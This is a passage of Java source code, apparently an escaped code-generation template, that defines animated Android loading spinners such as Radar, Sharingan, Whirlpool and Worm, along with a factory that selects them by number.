{\n\t\t\t\t\t\t\t\t\t\tinvalidateListener.reDraw();\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t});\n\n\t\t\t\t\t\tfadeAnimator.start();\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\t@Override public void draw(android.graphics.Canvas canvas) {\n\t\t\t\t\tfor (int i \u003d 0; i \u003c numberOfCircle; i++) {\n\t\t\t\t\t\tcanvas.save();\n\t\t\t\t\t\tcanvas.rotate(rotates[i], center.x, center.y);\n\t\t\t\t\t\tcircles[i].draw(canvas);\n\t\t\t\t\t\tcanvas.restore();\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\n\n\n\t\t\tpublic abstract class GraphicObject {\n\t\t\t\tprotected android.graphics.Paint paint;\n\n\t\t\t\tpublic GraphicObject() {\n\t\t\t\t\tpaint \u003d new android.graphics.Paint();\n\t\t\t\t\tpaint.setAntiAlias(true);\n\t\t\t\t}\n\n\t\t\t\tpublic void setColor(int color) {\n\t\t\t\t\tpaint.setColor(color);\n\t\t\t\t}\n\n\t\t\t\tpublic void setAlpha(int alpha) {\n\t\t\t\t\tpaint.setAlpha(alpha);\n\t\t\t\t}\n\n\t\t\t\tpublic void setWidth(float width) {\n\t\t\t\t\tpaint.setStrokeWidth(width);\n\t\t\t\t}\n\n\t\t\t\tpublic void setStyle(android.graphics.Paint.Style style) {\n\t\t\t\t\tpaint.setStyle(style);\n\t\t\t\t}\n\n\t\t\t\tpublic abstract void draw(android.graphics.Canvas canvas);\n\t\t\t}\n\n\n\t\t\tpublic interface InvalidateListener {\n\t\t\t\tvoid reDraw();\n\t\t\t}\n\n\t\t\tpublic class InvalidNumberOfPulseException extends Exception {\n\n\t\t\t\t@Override public String getMessage() {\n\t\t\t\t\treturn \"The number of pulse must be between 2 and 6\";\n\t\t\t\t}\n\t\t\t}\n\n\n\t\t\tpublic class Line extends GraphicObject {\n\t\t\t\tprivate PointF point1;\n\t\t\t\tprivate PointF point2;\n\n\t\t\t\tpublic void setPoint1(PointF point1) {\n\t\t\t\t\tthis.point1 \u003d point1;\n\t\t\t\t}\n\n\t\t\t\tpublic void setPoint2(PointF point2) {\n\t\t\t\t\tthis.point2 \u003d point2;\n\t\t\t\t}\n\n\t\t\t\tpublic PointF getPoint1() {\n\t\t\t\t\treturn point1;\n\t\t\t\t}\n\n\t\t\t\tpublic PointF getPoint2() {\n\t\t\t\t\treturn point2;\n\t\t\t\t}\n\n\t\t\t\t@Override public void draw(android.graphics.Canvas canvas) {\n\t\t\t\t\tcanvas.drawLine(point1.x, point1.y, point2.x, point2.y, paint);\n\t\t\t\t}\n\t\t\t}\n\n\n\t\t\tpublic class LineSpinner extends LoaderView {\n\t\t\t\tprivate Line[] lines;\n\t\t\t\tprivate int numberOfLine;\n\n\t\t\t\tpublic LineSpinner() {\n\t\t\t\t\tnumberOfLine \u003d 8;\n\t\t\t\t}\n\n\t\t\t\t@Override public void initializeObjects() {\n\t\t\t\t\tint size \u003d Math.min(width, height);\n\t\t\t\t\tfloat lineWidth \u003d size / 10f;\n\t\t\t\t\tlines \u003d new Line[numberOfLine];\n\n\t\t\t\t\tfor (int i \u003d 0; i \u003c numberOfLine; i++) {\n\t\t\t\t\t\tlines[i] \u003d new Line();\n\t\t\t\t\t\tlines[i].setColor(color);\n\t\t\t\t\t\tlines[i].setAlpha(126);\n\t\t\t\t\t\tlines[i].setWidth(lineWidth);\n\t\t\t\t\t\tlines[i].setPoint1(new PointF(center.x, center.y - size / 2f + lineWidth));\n\t\t\t\t\t\tlines[i].setPoint2(new PointF(center.x, lines[i].getPoint1().y + 2 * lineWidth));\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\t@Override public void setUpAnimation() {\n\t\t\t\t\tfor (int i \u003d 0; i \u003c numberOfLine; i++) {\n\t\t\t\t\t\tfinal int index \u003d i;\n\n\t\t\t\t\t\tandroid.animation.ValueAnimator fadeAnimator \u003d android.animation.ValueAnimator.ofInt(126, 255, 126);\n\t\t\t\t\t\tfadeAnimator.setRepeatCount(android.animation.ValueAnimator.INFINITE);\n\t\t\t\t\t\tfadeAnimator.setDuration(1000);\n\t\t\t\t\t\tfadeAnimator.setStartDelay(index * 120);\n\t\t\t\t\t\tfadeAnimator.addUpdateListener(new android.animation.ValueAnimator.AnimatorUpdateListener() {\n\t\t\t\t\t\t\t\t@Override public void onAnimationUpdate(android.animation.ValueAnimator animation) {\n\t\t\t\t\t\t\t\t\tlines[index].setAlpha((int)animation.getAnimatedValue());\n\t\t\t\t\t\t\t\t\tif (invalidateListener !\u003d null) {\n\t\t\t\t\t\t\t\t\t\tinvalidateListener.reDraw();\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t});\n\n\t\t\t\t\t\tfadeAnimator.start();\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\t@Override public void draw(android.graphics.Canvas canvas) {\n\t\t\t\t\tfor (int i \u003d 0; i \u003c numberOfLine; i++) {\n\t\t\t\t\t\tcanvas.save();\n\t\t\t\t\t\tcanvas.rotate(45 * i, center.x, center.y);\n\t\t\t\t\t\tlines[i].draw(canvas);\n\t\t\t\t\t\tcanvas.restore();\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\n\n\t\t\tpublic class PhoneWave extends LoaderView {\n\t\t\t\tprivate Arc[] arcs;\n\t\t\t\tprivate int numberOfArc;\n\n\t\t\t\tpublic PhoneWave() {\n\t\t\t\t\tnumberOfArc \u003d 3;\n\t\t\t\t}\n\n\t\t\t\t@Override public void initializeObjects() {\n\t\t\t\t\tfloat r \u003d Math.min(width, height) / 2f;\n\t\t\t\t\tarcs \u003d new Arc[numberOfArc];\n\n\t\t\t\t\tfor (int i \u003d 0; i \u003c numberOfArc; i++) {\n\t\t\t\t\t\tfloat d \u003d r / 4 + i * r / 4;\n\t\t\t\t\t\tarcs[i] \u003d new Arc();\n\t\t\t\t\t\tarcs[i].setColor(color);\n\t\t\t\t\t\tarcs[i].setAlpha(126);\n\t\t\t\t\t\tarcs[i].setOval(new android.graphics.RectF(center.x - d, center.y - d + r / 3, center.x + d, center.y + d + r / 3));\n\t\t\t\t\t\tarcs[i].setStartAngle(225);\n\t\t\t\t\t\tarcs[i].setSweepAngle(90);\n\t\t\t\t\t\tarcs[i].setStyle(android.graphics.Paint.Style.STROKE);\n\t\t\t\t\t\tarcs[i].setWidth(r / 10f);\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\t@Override public void setUpAnimation() {\n\t\t\t\t\tfor (int i \u003d 0; i \u003c numberOfArc; i++) {\n\t\t\t\t\t\tfinal int index \u003d i;\n\n\t\t\t\t\t\tandroid.animation.ValueAnimator fadeAnimator \u003d android.animation.ValueAnimator.ofInt(126, 255, 126);\n\t\t\t\t\t\tfadeAnimator.setRepeatCount(android.animation.ValueAnimator.INFINITE);\n\t\t\t\t\t\tfadeAnimator.setDuration(1000);\n\t\t\t\t\t\tfadeAnimator.setStartDelay(i * 120);\n\t\t\t\t\t\tfadeAnimator.addUpdateListener(new android.animation.ValueAnimator.AnimatorUpdateListener() {\n\t\t\t\t\t\t\t\t@Override public void onAnimationUpdate(android.animation.ValueAnimator animation) {\n\t\t\t\t\t\t\t\t\tarcs[index].setAlpha((int)animation.getAnimatedValue());\n\t\t\t\t\t\t\t\t\tif (invalidateListener !\u003d null) {\n\t\t\t\t\t\t\t\t\t\tinvalidateListener.reDraw();\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t});\n\n\t\t\t\t\t\tfadeAnimator.start();\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\t@Override public void draw(android.graphics.Canvas canvas) {\n\t\t\t\t\tfor (int i \u003d 0; i \u003c numberOfArc; i++) {\n\t\t\t\t\t\tarcs[i].draw(canvas);\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\n\n\t\t\tpublic class Pulse extends LoaderView {\n\t\t\t\tprivate Line[] lines;\n\t\t\t\tprivate int numberOfLines;\n\t\t\t\tprivate float lineWidth;\n\t\t\t\tprivate float lineDistance;\n\t\t\t\tprivate float[] scaleY;\n\n\t\t\t\tpublic Pulse(int numberOfLines) throws InvalidNumberOfPulseException {\n\t\t\t\t\tif (numberOfLines \u003c 3 || numberOfLines \u003e 5) {\n\t\t\t\t\t\tthrow new InvalidNumberOfPulseException();\n\t\t\t\t\t}\n\n\t\t\t\t\tthis.numberOfLines \u003d numberOfLines;\n\t\t\t\t\tlines \u003d new Line[numberOfLines];\n\t\t\t\t\tscaleY \u003d new float[numberOfLines];\n\t\t\t\t}\n\n\t\t\t\t@Override public void initializeObjects() {\n\t\t\t\t\tlineWidth \u003d width / (2 * numberOfLines);\n\t\t\t\t\tlineDistance \u003d lineWidth / 4f;\n\t\t\t\t\tfloat firstX \u003d (width - (lineWidth * numberOfLines + lineDistance * (numberOfLines - 1))) / 2f + lineWidth / 2f;\n\t\t\t\t\tfor (int i \u003d 0; i \u003c numberOfLines; i++) {\n\t\t\t\t\t\tlines[i] \u003d new Line();\n\t\t\t\t\t\tlines[i].setColor(color);\n\t\t\t\t\t\tlines[i].setWidth(lineWidth);\n\t\t\t\t\t\tlines[i].setPoint1(new PointF(firstX, center.y - height / 4f));\n\t\t\t\t\t\tlines[i].setPoint2(new PointF(firstX, center.y + height / 4f));\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\t@Override public void setUpAnimation() {\n\t\t\t\t\tfor (int i \u003d 0; i \u003c numberOfLines; i++) {\n\t\t\t\t\t\tfinal int index \u003d i;\n\t\t\t\t\t\tandroid.animation.ValueAnimator scaleAnimator \u003d android.animation.ValueAnimator.ofFloat(1f, 1.5f, 1f);\n\t\t\t\t\t\tscaleAnimator.setDuration(1000);\n\t\t\t\t\t\tscaleAnimator.setStartDelay(i * 120);\n\t\t\t\t\t\tscaleAnimator.setRepeatCount(android.animation.ValueAnimator.INFINITE);\n\t\t\t\t\t\tscaleAnimator.addUpdateListener(new android.animation.ValueAnimator.AnimatorUpdateListener() {\n\t\t\t\t\t\t\t\t@Override public void onAnimationUpdate(android.animation.ValueAnimator animation) {\n\t\t\t\t\t\t\t\t\tscaleY[index] \u003d (float)animation.getAnimatedValue();\n\t\t\t\t\t\t\t\t\tif (invalidateListener !\u003d null) {\n\t\t\t\t\t\t\t\t\t\tinvalidateListener.reDraw();\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t});\n\n\t\t\t\t\t\tscaleAnimator.start();\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\t@Override public void draw(android.graphics.Canvas canvas) {\n\t\t\t\t\tfor (int i \u003d 0; i \u003c numberOfLines; i++) {\n\t\t\t\t\t\tcanvas.save();\n\t\t\t\t\t\tcanvas.translate(i * (lineWidth + lineDistance), 0);\n\t\t\t\t\t\tcanvas.scale(1, scaleY[i], lines[i].getPoint1().x, center.y);\n\t\t\t\t\t\tlines[i].draw(canvas);\n\t\t\t\t\t\tcanvas.restore();\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\n\n\t\t\tpublic class Radar extends LoaderView {\n\t\t\t\tprivate Line line;\n\t\t\t\tprivate float degree;\n\n\t\t\t\t@Override public void initializeObjects() {\n\t\t\t\t\tfinal float size \u003d Math.min(width, height);\n\t\t\t\t\tline \u003d new Line();\n\t\t\t\t\tline.setPoint1(center);\n\t\t\t\t\tline.setPoint2(new PointF(0, size / 2f));\n\t\t\t\t\tline.setColor(color);\n\t\t\t\t\tline.setWidth(5);\n\t\t\t\t}\n\n\t\t\t\t@Override public void setUpAnimation() {\n\t\t\t\t\tandroid.animation.ValueAnimator animator \u003d android.animation.ValueAnimator.ofFloat(0, 359);\n\t\t\t\t\tanimator.setDuration(1000);\n\t\t\t\t\tanimator.setRepeatCount(android.animation.ValueAnimator.INFINITE);\n\t\t\t\t\tanimator.addUpdateListener(new android.animation.ValueAnimator.AnimatorUpdateListener() {\n\t\t\t\t\t\t\t@Override public void onAnimationUpdate(android.animation.ValueAnimator animation) {\n\t\t\t\t\t\t\t\tdegree \u003d (float)animation.getAnimatedValue();\n\t\t\t\t\t\t\t\tif (invalidateListener !\u003d null) {\n\t\t\t\t\t\t\t\t\tinvalidateListener.reDraw();\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t});\n\n\t\t\t\t\tanimator.start();\n\t\t\t\t}\n\n\t\t\t\t@Override public void draw(android.graphics.Canvas canvas) {\n\t\t\t\t\tcanvas.save();\n\t\t\t\t\tcanvas.rotate(degree, center.x, center.y);\n\t\t\t\t\tline.draw(canvas);\n\t\t\t\t\tcanvas.restore();\n\t\t\t\t}\n\t\t\t}\n\n\n\t\t\tpublic class Sharingan extends LoaderView {\n\t\t\t\tprivate Circle eye;\n\t\t\t\tprivate Circle eyeBound;\n\t\t\t\tprivate Circle[] sharingans;\n\t\t\t\tprivate int numberOfSharingan;\n\t\t\t\tprivate float rotate;\n\t\t\t\tprivate float scale;\n\t\t\t\tprivate float eyeBoundRadius;\n\t\t\t\tprivate float eyeBoundRadiusScale;\n\n\t\t\t\tpublic Sharingan() {\n\t\t\t\t\tnumberOfSharingan \u003d 3;\n\t\t\t\t}\n\n\t\t\t\t@Override public void initializeObjects() {\n\t\t\t\t\tfloat r \u003d Math.min(width, height) / 2f;\n\t\t\t\t\teyeBoundRadius \u003d r / 1.5f;\n\n\t\t\t\t\teye \u003d new Circle();\n\t\t\t\t\teye.setCenter(center.x, center.y);\n\t\t\t\t\teye.setColor(color);\n\t\t\t\t\teye.setRadius(r / 4);\n\n\t\t\t\t\teyeBound \u003d new Circle();\n\t\t\t\t\teyeBound.setCenter(center.x, center.y);\n\t\t\t\t\teyeBound.setColor(color);\n\t\t\t\t\teyeBound.setRadius(eyeBoundRadius);\n\t\t\t\t\teyeBound.setStyle(android.graphics.Paint.Style.STROKE);\n\t\t\t\t\teyeBound.setWidth(r / 20f);\n\n\t\t\t\t\tsharingans \u003d new Circle[numberOfSharingan];\n\t\t\t\t\tfor (int i \u003d 0; i \u003c numberOfSharingan; i++) {\n\t\t\t\t\t\tsharingans[i] \u003d new Circle();\n\t\t\t\t\t\tsharingans[i].setCenter(center.x, center.y - eyeBoundRadius);\n\t\t\t\t\t\tsharingans[i].setColor(color);\n\t\t\t\t\t\tsharingans[i].setRadius(r / 6);\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\t@Override public void setUpAnimation() {\n\t\t\t\t\tandroid.animation.ValueAnimator rotateAnimator \u003d android.animation.ValueAnimator.ofFloat(0, 360);\n\t\t\t\t\trotateAnimator.setDuration(1500);\n\t\t\t\t\trotateAnimator.setRepeatCount(android.animation.ValueAnimator.INFINITE);\n\t\t\t\t\trotateAnimator.addUpdateListener(new android.animation.ValueAnimator.AnimatorUpdateListener() {\n\t\t\t\t\t\t\t@Override public void onAnimationUpdate(android.animation.ValueAnimator animation) {\n\t\t\t\t\t\t\t\trotate \u003d (float)animation.getAnimatedValue();\n\t\t\t\t\t\t\t\tif (invalidateListener !\u003d null) {\n\t\t\t\t\t\t\t\t\tinvalidateListener.reDraw();\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t});\n\n\t\t\t\t\tandroid.animation.ValueAnimator scaleAnimator \u003d android.animation.ValueAnimator.ofFloat(1f, 0.8f, 1f);\n\t\t\t\t\tscaleAnimator.setDuration(1000);\n\t\t\t\t\tscaleAnimator.setRepeatCount(android.animation.ValueAnimator.INFINITE);\n\t\t\t\t\tscaleAnimator.addUpdateListener(new android.animation.ValueAnimator.AnimatorUpdateListener() {\n\t\t\t\t\t\t\t@Override public void onAnimationUpdate(android.animation.ValueAnimator animation) {\n\t\t\t\t\t\t\t\tscale \u003d (float)animation.getAnimatedValue();\n\t\t\t\t\t\t\t\tif (invalidateListener !\u003d null) {\n\t\t\t\t\t\t\t\t\tinvalidateListener.reDraw();\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t});\n\n\t\t\t\t\tandroid.animation.AnimatorSet animatorSet \u003d new android.animation.AnimatorSet();\n\t\t\t\t\tanimatorSet.play(rotateAnimator).with(scaleAnimator);\n\t\t\t\t\tanimatorSet.start();\n\t\t\t\t}\n\n\t\t\t\t@Override public void draw(android.graphics.Canvas canvas) {\n\t\t\t\t\tcanvas.save();\n\t\t\t\t\tcanvas.scale(scale, scale, center.x, center.y);\n\t\t\t\t\tcanvas.rotate(rotate, center.x, center.y);\n\t\t\t\t\teye.draw(canvas);\n\t\t\t\t\teyeBound.draw(canvas);\n\t\t\t\t\tfor (int i \u003d 0; i \u003c numberOfSharingan; i++) {\n\t\t\t\t\t\tcanvas.save();\n\t\t\t\t\t\tcanvas.rotate(i * 120, center.x, center.y);\n\t\t\t\t\t\tsharingans[i].draw(canvas);\n\t\t\t\t\t\tcanvas.restore();\n\t\t\t\t\t}\n\t\t\t\t\tcanvas.restore();\n\t\t\t\t}\n\t\t\t}\n\n\n\t\t\tpublic class TwinFishesSpinner extends LoaderView {\n\t\t\t\tprivate Circle[] circles;\n\t\t\t\tprivate int numberOfCircle;\n\t\t\t\tprivate float[] rotates;\n\n\t\t\t\tpublic TwinFishesSpinner() {\n\t\t\t\t\tnumberOfCircle \u003d 10;\n\t\t\t\t\trotates \u003d new float[numberOfCircle];\n\t\t\t\t}\n\n\t\t\t\t@Override public void initializeObjects() {\n\t\t\t\t\tfinal float size \u003d Math.min(width, height);\n\t\t\t\t\tfinal float circleRadius \u003d size / 10.0f;\n\t\t\t\t\tcircles \u003d new Circle[numberOfCircle];\n\n\t\t\t\t\tfor (int i \u003d 0; i \u003c numberOfCircle / 2; i++) {\n\t\t\t\t\t\tcircles[i] \u003d new Circle();\n\t\t\t\t\t\tcircles[i].setCenter(center.x, circleRadius);\n\t\t\t\t\t\tcircles[i].setColor(color);\n\t\t\t\t\t\tcircles[i].setRadius(circleRadius - circleRadius * i / 6);\n\t\t\t\t\t}\n\n\t\t\t\t\tfor (int i \u003d numberOfCircle / 2; i \u003c numberOfCircle; i++) {\n\t\t\t\t\t\tcircles[i] \u003d new Circle();\n\t\t\t\t\t\tcircles[i].setCenter(center.x, size - circleRadius);\n\t\t\t\t\t\tcircles[i].setColor(color);\n\t\t\t\t\t\tcircles[i].setRadius(circleRadius - circleRadius * (i - 5) / 6);\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\t@Override public void setUpAnimation() {\n\t\t\t\t\tfor (int i \u003d 0; i \u003c numberOfCircle; i++) {\n\t\t\t\t\t\tfinal int index \u003d i;\n\n\t\t\t\t\t\tandroid.animation.ValueAnimator fadeAnimator \u003d android.animation.ValueAnimator.ofFloat(0, 360);\n\t\t\t\t\t\tfadeAnimator.setRepeatCount(android.animation.ValueAnimator.INFINITE);\n\t\t\t\t\t\tfadeAnimator.setDuration(1700);\n\t\t\t\t\t\tfadeAnimator.setStartDelay((index \u003e\u003d 5 ? index - 5 : index) * 100);\n\t\t\t\t\t\tfadeAnimator.addUpdateListener(new android.animation.ValueAnimator.AnimatorUpdateListener() {\n\t\t\t\t\t\t\t\t@Override public void onAnimationUpdate(android.animation.ValueAnimator animation) {\n\t\t\t\t\t\t\t\t\trotates[index] \u003d (float)animation.getAnimatedValue();\n\t\t\t\t\t\t\t\t\tif (invalidateListener !\u003d null) {\n\t\t\t\t\t\t\t\t\t\tinvalidateListener.reDraw();\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t});\n\n\t\t\t\t\t\tfadeAnimator.start();\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\t@Override public void draw(android.graphics.Canvas canvas) {\n\t\t\t\t\tfor (int i \u003d 0; i \u003c numberOfCircle; i++) {\n\t\t\t\t\t\tcanvas.save();\n\t\t\t\t\t\tcanvas.rotate(rotates[i], center.x, center.y);\n\t\t\t\t\t\tcircles[i].draw(canvas);\n\t\t\t\t\t\tcanvas.restore();\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\n\n\t\t\tpublic class Whirlpool extends LoaderView {\n\t\t\t\tprivate Arc[] arcs;\n\t\t\t\tprivate int numberOfArc;\n\t\t\t\tprivate float[] rotates;\n\n\t\t\t\tpublic Whirlpool() {\n\t\t\t\t\tnumberOfArc \u003d 3;\n\t\t\t\t}\n\n\t\t\t\t@Override public void initializeObjects() {\n\t\t\t\t\tfloat r \u003d Math.min(width, height) / 2f;\n\t\t\t\t\tarcs \u003d new Arc[numberOfArc];\n\t\t\t\t\trotates \u003d new float[numberOfArc];\n\n\t\t\t\t\tfor (int i \u003d 0; i \u003c numberOfArc; i++) {\n\t\t\t\t\t\tfloat d \u003d r / 4 + i * r / 4;\n\t\t\t\t\t\tarcs[i] \u003d new Arc();\n\t\t\t\t\t\tarcs[i].setColor(color);\n\t\t\t\t\t\tarcs[i].setOval(new android.graphics.RectF(center.x - d, center.y - d, center.x + d, center.y + d));\n\t\t\t\t\t\tarcs[i].setStartAngle(i * 45);\n\t\t\t\t\t\tarcs[i].setSweepAngle(i * 45 + 90);\n\t\t\t\t\t\tarcs[i].setStyle(android.graphics.Paint.Style.STROKE);\n\t\t\t\t\t\tarcs[i].setWidth(r / 10f);\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\t@Override public void setUpAnimation() {\n\t\t\t\t\tfor (int i \u003d numberOfArc - 1; i \u003e\u003d 0; i--) {\n\t\t\t\t\t\tfinal int index \u003d i;\n\n\t\t\t\t\t\tandroid.animation.ValueAnimator fadeAnimator \u003d android.animation.ValueAnimator.ofFloat(arcs[i].getStartAngle(),\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t   arcs[i].getStartAngle() + 360* (i %2$s 2 \u003d\u003d 0 ? -1 : 1));\n\t\t\t\t\t\tfadeAnimator.setRepeatCount(android.animation.ValueAnimator.INFINITE);\n\t\t\t\t\t\tfadeAnimator.setDuration((i + 1) * 500);\n\t\t\t\t\t\tfadeAnimator.addUpdateListener(new android.animation.ValueAnimator.AnimatorUpdateListener() {\n\t\t\t\t\t\t\t\t@Override public void onAnimationUpdate(android.animation.ValueAnimator animation) {\n\t\t\t\t\t\t\t\t\trotates[index] \u003d (float)animation.getAnimatedValue();\n\t\t\t\t\t\t\t\t\tif (invalidateListener !\u003d null) {\n\t\t\t\t\t\t\t\t\t\tinvalidateListener.reDraw();\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t});\n\n\t\t\t\t\t\tfadeAnimator.start();\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\t@Override public void draw(android.graphics.Canvas canvas) {\n\t\t\t\t\tfor (int i \u003d 0; i \u003c numberOfArc; i++) {\n\t\t\t\t\t\tcanvas.save();\n\t\t\t\t\t\tcanvas.rotate(rotates[i], center.x, center.y);\n\t\t\t\t\t\tarcs[i].draw(canvas);\n\t\t\t\t\t\tcanvas.restore();\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\n\n\n\t\t\tpublic class Worm extends LoaderView {\n\t\t\t\tprivate Circle[] circles;\n\t\t\t\tprivate int circlesSize;\n\t\t\t\tprivate float radius;\n\t\t\t\tprivate int[] transformations;\n\n\t\t\t\tpublic Worm() {\n\t\t\t\t\tcirclesSize \u003d 5;\n\t\t\t\t\ttransformations \u003d new int[]{-2, -1, 0, 1, 2};\n\t\t\t\t}\n\n\t\t\t\t@Override public void initializeObjects() {\n\t\t\t\t\tcircles \u003d new Circle[circlesSize];\n\t\t\t\t\tradius \u003d width / 10f - width / 100f;\n\n\t\t\t\t\tfor (int i \u003d 0; i \u003c circlesSize; i++) {\n\t\t\t\t\t\tcircles[i] \u003d new Circle();\n\t\t\t\t\t\tcircles[i].setColor(color);\n\t\t\t\t\t\tcircles[i].setRadius(radius);\n\t\t\t\t\t\tcircles[i].setCenter(center.x, center.y);\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\t@Override public void setUpAnimation() {\n\t\t\t\t\tfor (int i \u003d 0; i \u003c circlesSize; i++) {\n\t\t\t\t\t\tfinal int index \u003d i;\n\t\t\t\t\t\tandroid.animation.ValueAnimator translateAnimator \u003d android.animation.ValueAnimator.ofFloat(center.y, height / 4f, height * 3 / 4f, center.y);\n\t\t\t\t\t\ttranslateAnimator.setDuration(1000);\n\t\t\t\t\t\ttranslateAnimator.setStartDelay(index * 120);\n\t\t\t\t\t\ttranslateAnimator.setRepeatCount(android.animation.ValueAnimator.INFINITE);\n\t\t\t\t\t\ttranslateAnimator.addUpdateListener(new android.animation.ValueAnimator.AnimatorUpdateListener() {\n\t\t\t\t\t\t\t\t@Override public void onAnimationUpdate(android.animation.ValueAnimator animation) {\n\t\t\t\t\t\t\t\t\tcircles[index].setCenter(center.x, (float)animation.getAnimatedValue());\n\t\t\t\t\t\t\t\t\tif (invalidateListener !\u003d null) {\n\t\t\t\t\t\t\t\t\t\tinvalidateListener.reDraw();\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t});\n\n\t\t\t\t\t\ttranslateAnimator.start();\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\t@Override public void draw(android.graphics.Canvas canvas) {\n\t\t\t\t\tfor (int i \u003d 0; i \u003c circlesSize; i++) {\n\t\t\t\t\t\tcanvas.save();\n\t\t\t\t\t\tcanvas.translate(2 * radius * transformations[i], 0);\n\t\t\t\t\t\tcircles[i].draw(canvas);\n\t\t\t\t\t\tcanvas.restore();\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\n\n\n\t\t\tpublic abstract class LoaderView {\n\t\t\t\tprotected int color;\n\t\t\t\tprotected int width, height;\n\t\t\t\tprotected int desiredWidth, desiredHeight;\n\t\t\t\tprotected PointF center;\n\t\t\t\tprotected InvalidateListener invalidateListener;\n\n\t\t\t\tpublic LoaderView() {\n\t\t\t\t\tthis.desiredWidth \u003d 150;\n\t\t\t\t\tthis.desiredHeight \u003d 150;\n\t\t\t\t}\n\n\t\t\t\tpublic void setColor(int color) {\n\t\t\t\t\tthis.color \u003d color;\n\t\t\t\t}\n\n\t\t\t\tpublic void setSize(int width, int height) {\n\t\t\t\t\tthis.width \u003d width;\n\t\t\t\t\tthis.height \u003d height;\n\t\t\t\t\tthis.center \u003d new PointF(width / 2.0f, height / 2.0f);\n\t\t\t\t}\n\n\t\t\t\tpublic void setInvalidateListener(InvalidateListener invalidateListener) {\n\t\t\t\t\tthis.invalidateListener \u003d invalidateListener;\n\t\t\t\t}\n\n\t\t\t\tpublic int getDesiredWidth() {\n\t\t\t\t\treturn desiredWidth;\n\t\t\t\t}\n\n\t\t\t\tpublic int getDesiredHeight() {\n\t\t\t\t\treturn desiredHeight;\n\t\t\t\t}\n\n\t\t\t\tpublic abstract void initializeObjects();\n\n\t\t\t\tpublic abstract void setUpAnimation();\n\n\t\t\t\tpublic abstract void draw(android.graphics.Canvas canvas);\n\n\t\t\t\tpublic boolean isDetached() {\n\t\t\t\t\treturn invalidateListener \u003d\u003d null;\n\t\t\t\t}\n\n\t\t\t\tpublic void onDetach() {\n\t\t\t\t\tif (invalidateListener !\u003d null) {\n\t\t\t\t\t\tinvalidateListener \u003d null;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\n\n\t\t\tpublic static class LoaderGenerator {\n\t\t\t\tpublic static LoaderView generateLoaderView(int type) {\n\t\t\t\t\t%1$s aan \u003d new %1$s();\n\t\t\t\t\tswitch (type) {\n\t\t\t\t\t\tcase 0:\n\t\t\t\t\t\t\treturn aan.new ClassicSpinner();\n\t\t\t\t\t\tcase 1:\n\t\t\t\t\t\t\treturn aan.new FishSpinner();\n\t\t\t\t\t\tcase 2:\n\t\t\t\t\t\t\treturn aan.new LineSpinner();\n\t\t\t\t\t\tcase 3:\n\t\t\t\t\t\t\ttry {\n\t\t\t\t\t\t\t\treturn aan.new Pulse(3);\n\t\t\t\t\t\t\t} catch (InvalidNumberOfPulseException e) {\n\t\t\t\t\t\t\t\te.printStackTrace();\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\tcase 4:\n\t\t\t\t\t\t\ttry {\n\t\t\t\t\t\t\t\treturn aan.new Pulse(4);\n\t\t\t\t\t\t\t} catch (InvalidNumberOfPulseException e) {\n\t\t\t\t\t\t\t\te.printStackTrace();\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\tcase 5:\n\t\t\t\t\t\t\ttry {\n\t\t\t\t\t\t\t\treturn aan.new Pulse(5);\n\t\t\t\t\t\t\t} catch (InvalidNumberOfPulseException e) {\n\t\t\t\t\t\t\t\te.printStackTrace();\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\tcase 6:\n\t\t\t\t\t\t\treturn aan.new Radar();\n\t\t\t\t\t\tcase 7:\n\t\t\t\t\t\t\treturn aan.new TwinFishesSpinner();\n\t\t\t\t\t\tcase 8:\n\t\t\t\t\t\t\treturn aan.new Worm();\n\t\t\t\t\t\tcase 9:\n\t\t\t\t\t\t\treturn aan.new Whirlpool();\n\t\t\t\t\t\tcase 10:\n\t\t\t\t\t\t\treturn aan.new PhoneWave();\n\t\t\t\t\t\tcase 11:\n\t\t\t\t\t\t\treturn aan.new Sharingan();\n\t\t\t\t\t\tdefault:\n\t\t\t\t\t\t\treturn aan.new 